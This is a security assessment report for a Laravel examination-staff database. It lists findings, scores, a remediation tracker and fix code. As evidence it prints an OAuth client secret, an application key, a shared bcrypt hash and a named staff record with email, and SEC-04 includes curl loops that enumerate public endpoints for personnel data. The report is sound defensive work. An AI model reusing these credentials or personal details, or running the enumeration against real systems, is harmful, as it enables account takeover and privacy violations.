# ProCTAD — Pre-Deployment Security Assessment

**Target:** ProCTAD (Professionalized Corps of Test Administrators Database), CSC Regional Office VIII
**Stack:** Laravel 13.19.0 / PHP 8.3+ / Vue 3 + Inertia 3 / Vite 8 / MySQL
**Assessment type:** White-box source review (static), aligned to DICT VAPT reporting, OWASP Top 10 2021, OWASP ASVS 4.0
**Commit reviewed:** `3e849aa` (branch `main`, with uncommitted working-tree changes)
**Date:** 26 July 2026
**Last updated:** 26 July 2026 — remediation round 1 applied (see §0)

---

## 1. Executive Summary

ProCTAD is a well-engineered application. The authorization model is deliberate and largely correct: 21 policies, a permission registry, testing-center jurisdiction scoping, signed URLs instead of stored plaintext tokens, encrypted PII at rest (`date_of_birth`), a full `Auditable` trail, account lockout, and 67 feature/unit tests. Raw SQL is parameterized throughout. Mass assignment is explicitly declared. The public QR-verification endpoints were deliberately throttled against sequential-ID harvesting, with the reasoning documented in the route file.

That quality makes the failures that remain unusually stark, because they are almost all *deployment hygiene* rather than application logic:

- A **live Google OAuth client secret is committed to the repository** in `.env.example`, and is present in git history.
- A **legacy database dump containing real CSC staff records — names, `@csc.gov.ph` addresses, positions, and 61 bcrypt password hashes — is committed to the repository** as `legacy_proctad_db.sql`.
- **No HTTP security headers exist anywhere** in the application: no CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy or Permissions-Policy.
- The **public post-examination evaluation endpoints are unauthenticated, unthrottled, and enumerable**, disclosing test-administrator names and PROCTAD IDs — the exact exposure the QR routes were hardened against, missed on the adjacent feature.
- **13 known-vulnerable Composer advisories** across 3 packages, including three HIGH-severity PHPSpreadsheet issues.

None of these require deep exploitation skill to find. All of them are the sort of thing a DICT VAPT engagement reports on day one. All of them are also small, bounded fixes — the estimated remediation effort for every Critical and High finding is **1–2 developer-days**.

### Scores

| Metric | Score | Basis |
|---|---|---|
| **Overall Security Score** | **62 / 100** | Strong application-layer authorization; failing at secrets management, transport/header hardening, and dependency currency |
| **Production Readiness** | **48 / 100** | Blocked by committed credentials and staff password hashes |
| **DICT VAPT Readiness** | **Not ready** | 2 Critical + 5 High findings would be reported; credential exposure alone is a finding-of-record |

### Verdict

> ### 🔴 NOT READY FOR PRODUCTION
>
> Not because the application is insecure by design — it largely is not — but because a live OAuth secret and 61 staff password hashes are sitting in the source repository, and the app ships with no transport or browser-side hardening at all. Remediate SEC-01 through SEC-07 (roughly 1–2 days), re-run this assessment, and the system is a credible candidate for a **Ready with Minor Remediation** verdict.

---

## 0. Remediation Tracker

Live checklist. Update the status column as work lands; the checkpoints below are
the points at which it is worth re-running the verification commands.

**Legend:** ✅ done and verified · 🟡 partly done · ⬜ not started · 🔒 requires action outside this repository

### Checkpoint 1 — Code and configuration hardening
*Status: ✅ complete — 618/618 tests passing, `composer audit` and `npm audit` clean*

| # | Finding | Action | Status | Where |
|---|---|---|---|---|
| 1.1 | SEC-03 | `SecurityHeaders` middleware (CSP, HSTS, frame/sniff/referrer/permissions) | ✅ | `app/Http/Middleware/SecurityHeaders.php`, `bootstrap/app.php:23-30` |
| 1.2 | SEC-03 | Header behaviour locked in by tests | ✅ | `tests/Feature/SecurityHeadersTest.php` (12 tests) |
| 1.2a | SEC-03 | **Regression fixed:** the first CSP blocked the Vite dev server (`npm run dev`), rendering a blank page. `script`/`style`/`connect`/`font`/`img` now admit the dev origin and its HMR websocket when `public/hot` exists — empty in production. Inline JSON-LD carries a per-response nonce rather than needing `'unsafe-inline'` | ✅ | `SecurityHeaders::devServerOrigins()`, `resources/views/app.blade.php`, 4 regression tests |
| 1.3 | SEC-07 | Trusted proxies + trusted hosts + `forceScheme` | ✅ | `config/security.php`, `AppServiceProvider::enforceTransportSecurity()`, `bootstrap/app.php:44` |
| 1.4 | SEC-07 | `.env.production.example` with safe defaults | ✅ | `.env.production.example` |
| 1.5 | SEC-04 | Throttle `evaluations.search` / `evaluations.resolve` | ✅ | `routes/web.php:119-127`, `AppServiceProvider` limiter `evaluation-lookup` |
| 1.6 | SEC-04 | Search term `min:4`, anchored not `%…%`, exact PROCTAD ID | ✅ | `EvaluationController::search()` |
| 1.7 | SEC-05 | Submission bound to a resolved-in-session or owned assignment | ✅ | `EvaluationController::authorizeRespondent()` |
| 1.8 | SEC-05 | Attendance required + duplicate submission refused (409) | ✅ | `EvaluationController::store()` |
| 1.9 | SEC-05 | Unique index on `evaluations.exam_assignment_id` | ✅ | `2026_07_26_120000_add_unique_exam_assignment_to_evaluations.php` ⚠️ **review before running on live data — it deletes duplicate rows** |
| 1.10 | SEC-06 | Composer packages updated | ✅ | phpspreadsheet `1.30.5→1.30.6`, dompdf `3.1.x→v3.1.6`, guzzle `→7.15.1` |
| 1.11 | SEC-06 | dompdf config pinned, `chroot` narrowed to the asset directories | ✅ | `config/dompdf.php` |
| 1.12 | SEC-06 | npm advisories resolved | ✅ | `npm audit` → 0 vulnerabilities |
| 1.13 | SEC-08 | `nosniff` + sandbox CSP on inline file responses | ✅ | `MemberController::FILE_HEADERS`, used by both photo endpoints |
| 1.14 | SEC-09 | HTML-escape substituted values in email templates | ✅ | `EmailTemplate::render()` |
| 1.15 | SEC-10 | `EscapesFormulas` applied to all four exports | ✅ | `app/Exports/Concerns/EscapesFormulas.php` |
| 1.16 | SEC-11 | Require `email_verified`; no re-link of a bound account; no forced remember-me | ✅ | `GoogleAuthController::callback()`, +2 tests |
| 1.17 | SEC-12 | Service worker no longer caches authenticated HTML; purge on logout | ✅ | `public/sw.js` (v2), `DashboardLayout.vue` logout handler |
| 1.18 | SEC-13 | Signed URLs redacted before writing to `email_logs` | ✅ | `NotificationMailer::redactSignatures()` |
| 1.19 | SEC-14 | Account-state checks moved after credential verification | ✅ | `AuthenticatedSessionController::store()` |
| 1.20 | SEC-15 | Password floor 12 chars + `uncompromised()` in production | ✅ | `AppServiceProvider::definePasswordPolicy()` |
| 1.21 | SEC-18 | Audit trail drops tokens, masks PII | ✅ | `Auditable::AUDIT_HIDDEN` / `AUDIT_MASKED` |
| 1.22 | SEC-20 | Export endpoints throttled | ✅ | `routes/web.php`, limiter `exports` |
| 1.23 | SEC-01/02 | `.env.example` sanitised; `*.sql` gitignored and untracked | ✅ | `.env.example`, `.gitignore`, `git rm --cached` (staged) |
| 1.24 | SEC-02 | `proctad:force-password-reset` command | ✅ | `app/Console/Commands/ForcePasswordReset.php` |
| 1.25 | SEC-01/02/07 | Preflight fails the deploy on all of the above | ✅ | `Preflight::transportSecurity()`, `exposedFiles()`, legacy-credential check, +5 tests |

**Verify checkpoint 1:**
```bash
php artisan test          # expect 618 passing
composer audit            # expect: no advisories
npm audit --omit=dev      # expect: 0 vulnerabilities
vendor/bin/pint --test    # pre-existing findings elsewhere; touched files are clean
```

### Checkpoint 2 — Credential rotation and history purge 🔒
*Status: ⬜ not started — **this is what still blocks production***

These cannot be done from the repository. Until they are, the exposed secrets remain exposed:
sanitising `.env.example` does not remove it from git history, and the 61 leaked hashes are already out.

| # | Finding | Action | Status | Owner |
|---|---|---|---|---|
| 2.1 | SEC-01 | **Revoke and rotate the Google OAuth client secret** in Cloud Console | ⬜ | Dev/Ops |
| 2.2 | SEC-01 | Rotate `APP_KEY` — ⚠️ the local `.env` is **currently running the key that was published in `.env.example`** (verified). Plan the `date_of_birth` re-encryption; outstanding signed links are invalidated | ⬜ | Dev/Ops |
| 2.3 | SEC-01/02 | Purge `.env.example` secrets and all four `.sql` files from git history, then force-push | ⬜ | Dev/Ops |
| 2.4 | SEC-02 | `php artisan proctad:force-password-reset --legacy --dry-run`, review, then run for real | ⬜ | Dev/Ops |
| 2.5 | SEC-02 | Brief the CSC Data Protection Officer; assess NPC notification under RA 10173 | ⬜ | DPO |
| 2.6 | SEC-02 | Notify affected staff before the forced prompt appears | ⬜ | ESD Admin |

**Verify checkpoint 2:**
```bash
git log --all -S'GOCSPX' --oneline          # expect: no output
git log --all --oneline -- legacy_proctad_db.sql   # expect: no output
php artisan proctad:preflight               # expect: APP_KEY origin + Legacy credentials pass
```

### Checkpoint 3 — Production configuration
*Status: ⬜ not started — do this on the live host*

| # | Action | Status |
|---|---|---|
| 3.1 | Build `.env` from `.env.production.example`; set `TRUSTED_PROXIES` to the real proxy CIDR and `TRUSTED_HOSTS` to the live hostname | ⬜ |
| 3.2 | Least-privilege database account (no root, no `GRANT`/`DROP`/`FILE`); TLS to the database | ⬜ |
| 3.3 | Document root set to `public/`; confirm `.env` and `*.sql` are not fetchable | ⬜ |
| 3.4 | TLS certificate + HTTP→HTTPS redirect at the web server | ⬜ |
| 3.5 | `composer install --no-dev --optimize-autoloader` and `php artisan config:cache route:cache view:cache` | ⬜ |
| 3.6 | Run `CSP_REPORT_ONLY=true` for one full exam cycle, review violations, then enforce | ⬜ |
| 3.7 | `php artisan proctad:preflight` exits 0 | ⬜ |

### Checkpoint 4 — Short-term (30 days)

| # | Finding | Action | Status |
|---|---|---|---|
| 4.1 | SEC-25 | CI pipeline: `composer audit`, `npm audit`, `pint`, `php artisan test`, gitleaks | ⬜ |
| 4.2 | SEC-04 | Move the evaluation flow onto emailed signed links (removes the search entirely) | ⬜ |
| 4.3 | SEC-13 | Retention window for `email_logs` bodies and `audit_logs` | ⬜ |
| 4.4 | SEC-20 | Convert exports to chunked `FromQuery`; queue large ones | ⬜ |
| 4.5 | SEC-23 | Self-host the fonts; drop `fonts.bunny.net` from the CSP | ⬜ |
| 4.6 | — | Clear the pre-existing `pint` findings across the repo (unrelated to this work) | ⬜ |

### Checkpoint 5 — Long-term (90 days)

| # | Finding | Action | Status |
|---|---|---|---|
| 5.1 | SEC-15 | MFA (TOTP) for all privileged roles | ⬜ |
| 5.2 | SEC-16 | Unify authorization on the policy layer; route-coverage test | ⬜ |
| 5.3 | SEC-17 | Rank-aware guards in `UserPolicy::update()` and the role field | ⬜ |
| 5.4 | SEC-19 | Security log channel + authorization-failure logging + alerting | ⬜ |
| 5.5 | §7.9 | RA 10173 programme: retention schedule, read-access logging, data-subject export/erasure | ⬜ |
| 5.6 | SEC-21 | Hash scanner tokens at rest; shorten maximum expiry to 24 h | ⬜ |
| 5.7 | §7.5 | Encrypt `email` / `mobile_number` at rest | ⬜ |
| 5.8 | — | Independent penetration test against the hardened build, pre-VAPT | ⬜ |

### Progress

| Severity | Total | Resolved in code | Awaiting checkpoint 2/3 | Deferred |
|---|---|---|---|---|
| 🔴 Critical | 2 | 0 | **2** | 0 |
| 🟠 High | 5 | 4 | 1 (SEC-07 needs host config) | 0 |
| 🟡 Medium | 8 | 8 | 0 | 0 |
| 🔵 Low | 6 | 2 | 0 | 4 |
| ⚪ Info | 4 | 1 | 1 | 2 |

**Both Critical findings remain open.** They are the two that cannot be closed by changing code — the
secret has to be revoked at Google, and the history has to be rewritten and force-pushed. Everything
downstream of them is done.

---

## 2. Executive Risk Dashboard

| Severity | Count | Findings |
|---|---|---|
| 🔴 **Critical** | 2 | SEC-01, SEC-02 |
| 🟠 **High** | 5 | SEC-03 … SEC-07 |
| 🟡 **Medium** | 8 | SEC-08 … SEC-15 |
| 🔵 **Low** | 6 | SEC-16 … SEC-21 |
| ⚪ **Informational** | 4 | SEC-22 … SEC-25 |

**Risk concentration:** 100% of Critical findings are secrets-in-repository. 60% of High findings are configuration/deployment, not code.

---

## 3. Findings by Severity

> Findings below describe the state at assessment time and are kept as written, so the
> evidence and reasoning stay reviewable. For what has since been fixed, see the tracker in §0.

---

### 🔴 SEC-01 — Live Google OAuth client secret committed to the repository

| | |
|---|---|
| **Severity** | Critical |
| **CVSS v3.1** | 9.1 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` (estimated) |
| **CWE** | CWE-798 (Use of Hard-coded Credentials), CWE-540 (Inclusion of Sensitive Information in Source Code) |
| **OWASP** | A07:2021 Identification and Authentication Failures / A02:2021 Cryptographic Failures |
| **Status** | ✅ Verified |

**Affected files**
- `.env.example:63` — `GOOGLE_CLIENT_SECRET=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`
- `.env.example:62` — `GOOGLE_CLIENT_ID=368345404621-gorrbbaam4gj9f0i08ufq8vlmbc30fas.apps.googleusercontent.com`
- `.env.example:3` — `APP_KEY=base64:gd0SfSBxVCRazK+ffmGw4JVxmeLK0GDx/ucxYUvh/0s=`
- Git history: commit `baed360` ("Updated .env.example")

**Risk description**
`.env.example` is a tracked file. It carries a production-format Google OAuth client secret (`GOCSPX-` prefix), the matching client ID, and a real base64 `APP_KEY`. Because these are in git history as well as the working tree, deleting the line from HEAD does not remove them.

**Exploitation scenario**
1. The repository is pushed to GitHub/GitLab, shared with a contractor, or handed to DICT as part of the VAPT scope.
2. An attacker extracts the client ID/secret pair (automated secret scanners do this within minutes of a public push).
3. With the pair, the attacker registers their own redirect URI against the OAuth client if they gain any console access, or — more directly — impersonates the application to Google's token endpoint to exchange authorization codes obtained through a phishing page that looks legitimate because it uses the **real** CSC client ID on the Google consent screen.
4. Registration in ProCTAD is Google-only (`RegisteredUserController::store()` trusts the session identity set by `GoogleAuthController::callback()`), so an attacker who can mint identities against this OAuth client can create accounts.

The `APP_KEY` compounds this: it signs every signed URL in the system (assignment-confirmation links, `Storage::disk('local')` file-serving URLs) and encrypts every `date_of_birth`.

> **Confirmed during remediation:** the working instance's `.env` holds **exactly the `APP_KEY` that was published in `.env.example`**. This is no longer hypothetical. Anyone who has cloned this repository can, against any environment still using that key, forge a valid signature for `/storage/{path}` and read arbitrary files under `storage/app/private` — member requirement documents, signatures, generated certificates — and decrypt every stored `date_of_birth`. `proctad:preflight` now fails on this specific key value.

**Technical impact:** Full impersonation of the application's OAuth identity; forgery of every signed URL if the key is reused.
**Business impact:** Compromise of the sign-in path for a government system; RA 10173 (Data Privacy Act) breach exposure; loss of the CSC OAuth client, requiring re-registration and re-consent for all users.

**Remediation**

1. **Revoke and rotate immediately** in Google Cloud Console — the exposed secret must be considered burned regardless of what else is done.
2. Rotate `APP_KEY` on any environment that used the example value. *Note: rotating `APP_KEY` invalidates existing encrypted `date_of_birth` values and all outstanding signed links — plan a re-encryption migration.*
3. Purge from git history:
   ```bash
   git filter-repo --path .env.example --invert-paths   # then re-add a clean file
   # or: bfg --replace-text secrets.txt
   git push --force-with-lease --all
   ```
4. Replace with placeholders only:
   ```dotenv
   # .env.example — placeholders ONLY. Never commit a real value.
   APP_KEY=
   GOOGLE_CLIENT_ID=your-client-id.apps.googleusercontent.com
   GOOGLE_CLIENT_SECRET=
   ```
5. Add a pre-commit secret scanner (`gitleaks`, `trufflehog`) to CI.

**Priority:** Immediate — before any push to a shared remote.

---

### 🔴 SEC-02 — Production database dump with staff PII and password hashes committed

| | |
|---|---|
| **Severity** | Critical |
| **CVSS v3.1** | 8.6 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` (estimated) |
| **CWE** | CWE-538 (Insertion of Sensitive Information into Externally-Accessible File), CWE-359 (Exposure of Private Personal Information) |
| **OWASP** | A01:2021 Broken Access Control / A02:2021 Cryptographic Failures |
| **Status** | ✅ Verified |

**Affected files**
- `legacy_proctad_db.sql` (1.1 MB, tracked since commit `2337995` "Initial commit")
- `proctad_db.sql` (60 KB, tracked)
- `storage/dropped_legacy_views_backup.sql`, `storage/pre_oep_migration_backup.sql` (tracked)

**Evidence**
`legacy_proctad_db.sql` line 6505 onward contains real personnel rows in this shape:

```
(1, 'Atty. Otelia Fe', 'Aguillon', 'Cabahug', 'C.', 'Female', 'ocaguillon',
 '$2y$10$RhXcMiZi4WsTRCPBhZu2M.SZ...', 'ofcaguillon@csc.gov.ph', ...)
```

- **61 bcrypt hashes** (`$2y$10$`) present
- **185 email addresses**, predominantly `@csc.gov.ph`
- Full names, middle names, usernames, sex, and position titles
- Tables include `proctad_password_reset_tokens`, `proctad_security_logs`, `proctad_login_attempts`, `proctad_oauth_state`

**Additional observation — shared default password:** all sampled hashes are byte-identical (`$2y$10$RhXcMiZi4WsTRCPBhZu2M.SZmErbz577wDvWW9yDEnNFrMI.IIblm`). This means every legacy account was seeded with the **same password**. An attacker needs to crack that single hash once to hold credentials for all 61 accounts — and bcrypt cost 10 on a known-weak default (`password123`, `csc2024`, or similar) falls in hours on commodity GPU hardware.

**Exploitation scenario**
1. Attacker obtains the repository (public push, contractor laptop, forked clone, VAPT scope handover).
2. Extracts the 61 hashes and cracks the single distinct value offline — no rate limit, no lockout, no detection.
3. Attempts that password against `POST /login` for each of the 185 harvested usernames/emails. Credentials that were carried across the legacy→Laravel migration authenticate directly.
4. Any account that lands is a CSC staff account with a Field Office or region-wide role.

**Technical impact:** Offline credential recovery for the entire legacy staff roster; likely direct authentication into the production system.
**Business impact:** Reportable personal data breach under RA 10173 (National Privacy Commission notification obligation); compromise of named CSC officials including senior attorneys; total loss of accountability in the audit trail, since an attacker acting as a real staff account is indistinguishable from that staff member.

**Remediation**

1. **Purge all four `.sql` files from git history** (`git filter-repo --path legacy_proctad_db.sql --path proctad_db.sql --path storage/dropped_legacy_views_backup.sql --path storage/pre_oep_migration_backup.sql --invert-paths`), then force-push.
2. **Force a password reset for every migrated legacy account.** Set `must_change_password = true` across the board — `EnsurePasswordIsChanged` middleware already enforces the gate, so the mechanism exists:
   ```php
   User::whereNotNull('username')->update(['must_change_password' => true]);
   ```
3. Add to `.gitignore` and enforce in CI:
   ```gitignore
   *.sql
   *.sql.gz
   /storage/*.sql
   ```
4. Move migration source data to an out-of-band, access-controlled location. `config/database.php:70-81` already defines a read-only `legacy` connection for `proctad:migrate-legacy` — the dump does not need to live in the repo at all.
5. Treat this as a **data breach event**: assess NPC notification requirements with the CSC Data Protection Officer.

**Priority:** Immediate.

---

### 🟠 SEC-03 — Complete absence of HTTP security headers

| | |
|---|---|
| **Severity** | High |
| **CVSS v3.1** | 6.5 — `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N` (estimated) |
| **CWE** | CWE-693 (Protection Mechanism Failure), CWE-1021 (Improper Restriction of Rendered UI Layers) |
| **OWASP** | A05:2021 Security Misconfiguration |
| **Status** | ✅ Verified |

**Affected files**
- `bootstrap/app.php:22-38` — middleware stack; no header middleware registered
- `public/.htaccess` — rewrite rules only, no `Header set` directives
- Repository-wide grep for `Content-Security-Policy|X-Frame-Options|Strict-Transport-Security|X-Content-Type-Options|Referrer-Policy|Permissions-Policy` across `app/`, `config/`, `public/`, `resources/views/`, `bootstrap/` returns **zero matches**

**Risk description**
Every response leaves the application with no browser-side defences:

| Header | Present | Consequence of absence |
|---|---|---|
| `Content-Security-Policy` | ❌ | No mitigation if any XSS sink is ever introduced; no control over the third-party font origin (`fonts.bunny.net`, `resources/views/app.blade.php:41`) |
| `Strict-Transport-Security` | ❌ | First-visit and post-cache-expiry requests are downgradeable; session cookie interceptable on hostile Wi-Fi (exam venues) |
| `X-Frame-Options` / `frame-ancestors` | ❌ | The entire authenticated console is framable → clickjacking against destructive actions (`certificates.bulk-approve`, `assignments.bulk-revoke`, `venues.rooms.clear`) |
| `X-Content-Type-Options` | ❌ | MIME sniffing on user-uploaded content served inline — see SEC-08 |
| `Referrer-Policy` | ❌ | Signed assignment-confirmation URLs (which *are* bearer credentials) leak in `Referer` to any external link |
| `Permissions-Policy` | ❌ | No restriction on camera access, notable given the scanner's `html5-qrcode` camera usage |

**Exploitation scenario (clickjacking)**
An attacker frames `https://proctad.csc.gov.ph/approvals` in a transparent iframe over a decoy page, socially engineers a Field Director into clicking through a positioned overlay, and drives `POST /certificates/bulk-approve`. Laravel's CSRF token travels automatically with the framed same-site session; `SESSION_SAME_SITE=lax` does not block top-level-initiated framed clicks on same-site content.

**Remediation**

Add a global header middleware:

```php
// app/Http/Middleware/SecurityHeaders.php
namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class SecurityHeaders
{
    public function handle(Request $request, Closure $next): Response
    {
        $response = $next($request);

        $response->headers->add([
            'X-Frame-Options' => 'DENY',
            'X-Content-Type-Options' => 'nosniff',
            'Referrer-Policy' => 'strict-origin-when-cross-origin',
            'Permissions-Policy' => 'camera=(self), microphone=(), geolocation=()',
            'Cross-Origin-Opener-Policy' => 'same-origin',
            'Cross-Origin-Resource-Policy' => 'same-origin',
            'Content-Security-Policy' => implode('; ', [
                "default-src 'self'",
                // Vite ships hashed, self-hosted bundles — no CDN needed.
                "script-src 'self'",
                // Tailwind v4 emits a stylesheet; inline styles remain for
                // Inertia-driven dynamic styling. Tighten to a nonce once audited.
                "style-src 'self' 'unsafe-inline' https://fonts.bunny.net",
                "font-src 'self' https://fonts.bunny.net data:",
                "img-src 'self' data: https://lh3.googleusercontent.com", // Google avatars
                "connect-src 'self'",
                "frame-ancestors 'none'",
                "base-uri 'self'",
                "form-action 'self'",
                "object-src 'none'",
            ]),
        ]);

        if ($request->secure()) {
            $response->headers->set(
                'Strict-Transport-Security',
                'max-age=31536000; includeSubDomains; preload',
            );
        }

        return $response;
    }
}
```

```php
// bootstrap/app.php
$middleware->web(append: [
    SecurityHeaders::class,      // first — applies to every response, including errors
    CheckMaintenanceMode::class,
    HandleInertiaRequests::class,
]);
```

Deploy CSP in `Content-Security-Policy-Report-Only` mode first, watch the violation reports for one exam cycle, then enforce.

**Priority:** Immediate (pre-deployment).

---

### 🟠 SEC-04 — Unauthenticated enumeration of test-administrator PII via the public evaluation endpoints

| | |
|---|---|
| **Severity** | High |
| **CVSS v3.1** | 7.5 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (estimated) |
| **CWE** | CWE-200 (Exposure of Sensitive Information), CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-307 (Improper Restriction of Excessive Authentication Attempts) |
| **OWASP** | A01:2021 Broken Access Control |
| **Status** | ✅ Verified |

**Affected files / functions**
- `routes/web.php:114-117` — the four evaluation routes, **no `throttle` middleware, no `auth`**
- `app/Http/Controllers/EvaluationController.php:143-175` — `search()`
- `app/Http/Controllers/EvaluationController.php:183-225` — `resolve()`

**Risk description**

`GET /evaluation/search?examination_id=1&q=a` accepts a single-character query (`'min:1'`, line 147) and returns up to 10 assignment records containing **full name, PROCTAD ID, designation, room number and venue school** for any examination — with no authentication and no rate limit.

`GET /evaluation/assignments/{assignment}` (`resolve()`) is a direct object reference on a **sequential integer primary key** with no authorization check whatsoever. The only guard is `abort_unless($assignment->role->isAnyOf(self::DESIGNATIONS) && $assignment->attendance_confirmed_at !== null, 404)` — a property check on the record, not a check on the caller. Each successful call returns the respondent's name, field office, venue school, room number, **and the complete roster of every Room Examiner and Proctor at that venue** via `available_ratees` (line 223).

This is precisely the exposure the QR routes were hardened against. `routes/web.php:73-79` documents the reasoning:

> *"Public QR verification. Throttled because certificate numbers are sequential … so an unthrottled endpoint lets anyone walk the range and harvest every releasee's name, PROCTAD ID and field office."*

The identical reasoning applies to `/evaluation/assignments/{id}`, and the control was not carried across.

**Exploitation scenario**
```bash
# Full regional roster in ~26 requests, no auth, no throttle:
for c in {a..z}; do
  curl -s "https://proctad.csc.gov.ph/evaluation/search?examination_id=1&q=$c"
done

# Or walk the sequential assignment IDs — each hit yields the whole venue roster:
for id in {1..50000}; do
  curl -s "https://proctad.csc.gov.ph/evaluation/assignments/$id"
done
```
The attacker reconstructs the complete deployment plan for a live civil service examination: who is proctoring, at which school, in which room. That is operationally sensitive — it is the target list for anyone attempting to approach or pressure an examination official.

**Technical impact:** Bulk PII extraction; full disclosure of examination staffing assignments.
**Business impact:** Examination integrity risk (proctors identified and approachable pre-exam); RA 10173 exposure; the deployment plan is arguably restricted operational information.

**Remediation**

```php
// routes/web.php — mirror the /verify hardening
Route::middleware('throttle:evaluation-lookup')->group(function () {
    Route::get('/evaluation/search', [EvaluationController::class, 'search'])
        ->name('evaluations.search');
    Route::get('/evaluation/assignments/{assignment}', [EvaluationController::class, 'resolve'])
        ->name('evaluations.resolve');
});
```

```php
// AppServiceProvider::boot() — a respondent looks themselves up once, not 500 times.
RateLimiter::for('evaluation-lookup', fn (Request $request) =>
    Limit::perMinute(10)->by($request->ip()));
```

Then tighten the search itself:

```php
// EvaluationController::search()
'q' => ['required', 'string', 'min:4', 'max:100'],   // was min:1
```

And require the search term to match the *whole* PROCTAD ID rather than a substring, so the endpoint confirms an identity the respondent already holds instead of discovering identities:

```php
->whereHas('member', function ($query) use ($term) {
    $query->where('proctad_id', $term)                       // exact
        ->orWhere(fn ($q) => $q->where('last_name', 'like', "{$term}%"));  // prefix, not %…%
})
```

Longer term, the strongest fix is to require possession of a per-assignment token — the same `URL::temporarySignedRoute` pattern `AssignmentConfirmationSender:52` already uses — so the evaluation form is reached from a link rather than by search.

**Priority:** Immediate.

---

### 🟠 SEC-05 — Evaluation submissions accept any assignment ID: unauthenticated ballot stuffing

| | |
|---|---|
| **Severity** | High |
| **CVSS v3.1** | 7.1 — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L` (estimated) |
| **CWE** | CWE-306 (Missing Authentication for Critical Function), CWE-639 (Authorization Bypass Through User-Controlled Key) |
| **OWASP** | A01:2021 Broken Access Control |
| **Status** | ✅ Verified |

**Affected file / function:** `app/Http/Controllers/EvaluationController.php:227-289` — `store()`

**Risk description**
`POST /evaluation` is public. It validates that `exam_assignment_id` exists and that the assignment's role is evaluable (line 238), but performs **no check that the submitter is that person** — no signed link, no session ownership check, no attendance requirement (note that `resolve()` at line 186 *does* require `attendance_confirmed_at !== null`; `store()` does not), and no uniqueness constraint preventing repeat submissions for the same assignment.

These submissions are not decorative. `PerformanceRatingCalculator` consumes them to derive performance ratings for test administrators, which surface in service history and feed accreditation decisions.

**Exploitation scenario**
1. Attacker enumerates assignment IDs via SEC-04.
2. Submits a Supervising Examiner evaluation for an ID they do not own, rating every Room Examiner and Proctor at that venue `1/5` across punctuality, decorum and procedures — all constrained only to `between:1,5` (lines 259-263).
3. Repeats at scale, or repeatedly for one target.
4. The affected administrators' performance ratings are permanently degraded, with a `respondent_name` on the record (line 282) that is derived from the *assignment*, not the submitter — so the forged evaluation is attributed to an innocent named individual.

**Technical impact:** Unauthenticated write to a records system that influences personnel decisions; no repudiation defence for the falsely-attributed respondent.
**Business impact:** Corruption of the performance evaluation basis for accreditation; grievance and administrative-liability exposure for CSC if an unfavourable rating is challenged and cannot be substantiated.

**Remediation**

1. **Bind the submission to a credential.** The cleanest fit with the existing architecture is a signed link, matching `AssignmentConfirmationSender`:

```php
// routes/web.php
Route::post('/evaluation', [EvaluationController::class, 'store'])
    ->middleware('signed')
    ->name('evaluations.store');
```

2. **Or**, at minimum, require that a signed-in member owns the assignment, and that anonymous submissions carry the session-held resolve token:

```php
// EvaluationController::store()
$assignment = ExamAssignment::with('member', 'examinationSchool')
    ->findOrFail($validated['exam_assignment_id']);

abort_unless(
    $assignment->attendance_confirmed_at !== null,
    422,
    'Attendance for this assignment has not been confirmed yet.',
);

// Own-record only when signed in — mirrors MyProctadController::respondToAssignment.
if ($member = $request->user()?->member) {
    abort_unless($assignment->member_id === $member->id, 403);
} else {
    // Anonymous: the assignment must have been resolved in *this* session.
    abort_unless(
        in_array($assignment->id, $request->session()->get('evaluation_resolved', []), true),
        403,
    );
}
```

3. **Add a uniqueness constraint** so one assignment yields one evaluation:

```php
// migration
$table->unique('exam_assignment_id');
```
```php
// EvaluationController::store()
abort_if(
    Evaluation::where('exam_assignment_id', $assignment->id)->exists(),
    409,
    'An evaluation has already been submitted for this assignment.',
);
```

4. Apply `throttle:5,1` to the route.

**Priority:** Immediate.

---

### 🟠 SEC-06 — Known-vulnerable dependencies (13 advisories, 3 packages)

| | |
|---|---|
| **Severity** | High |
| **CVSS v3.1** | 7.5 (highest constituent — CVE-2026-59931) |
| **CWE** | CWE-1395 (Dependency on Vulnerable Third-Party Component), CWE-918 (SSRF), CWE-400 (Uncontrolled Resource Consumption) |
| **OWASP** | A06:2021 Vulnerable and Outdated Components |
| **Status** | ✅ Verified (`composer audit`, `npm audit`) |

**Composer — 13 advisories affecting 3 packages**

| Package | Sev | Advisory | Relevance to ProCTAD |
|---|---|---|---|
| `phpoffice/phpspreadsheet` | **High** | CVE-2026-59931 — SSRF bypass via HTTP redirect in `WEBSERVICE()` domain whitelist | Reachable if any uploaded/templated spreadsheet is *read*. `TemplateExcelService` processes report templates from `storage/app/private/report-templates`. |
| `phpoffice/phpspreadsheet` | **High** | CVE-2026-59933 — XLS/OLE sector-chain self-loop → memory exhaustion | DoS on spreadsheet read |
| `phpoffice/phpspreadsheet` | **High** | CVE-2026-59932 — Gnumeric reader unbounded gzip expansion → memory exhaustion | DoS on spreadsheet read |
| `dompdf/dompdf` | Medium | Local file read via SVG data-URI path validation | Certificate rendering (`CertificateService`, `TemplatePdfService`) |
| `dompdf/dompdf` | Medium | Embedded SVG leaks filesystem existence | Certificate/ID-card rendering |
| `dompdf/dompdf` | Medium ×2 | Oversized bitmap / BMP-dimension resource exhaustion | DoS via uploaded letterhead or member photo embedded in a PDF |
| `dompdf/dompdf` | Low ×2 | Font-face file-existence oracle; chroot validation bypass | Information disclosure |
| `guzzlehttp/guzzle` | Medium ×4 | Proxy-Authorization leakage to origin; host-only cookie scope; unbounded response cookies; URI fragment in Referer | Transitive via Socialite's Google calls |

*Mitigating factor:* dompdf's `enable_remote` and `enable_php` are both `false` by default (`vendor/barryvdh/laravel-dompdf/config/dompdf.php:236,270`) and `chroot` is set to `base_path()`, which blunts several of the dompdf issues. This is **default** configuration, however — it is not pinned by a published `config/dompdf.php` in this project, so a future `vendor:publish` or package update could silently change it.

**npm — high-severity findings**
`postcss` (≤8.5.17, CWE-22 path traversal via `sourceMappingURL`, CVSS 7.5), `shell-quote` (quadratic-complexity DoS) via `concurrently`. Both are **devDependencies** — not shipped to production, but they execute on the build machine and in CI, which is a software-integrity concern (A08:2021).

**Remediation**

```bash
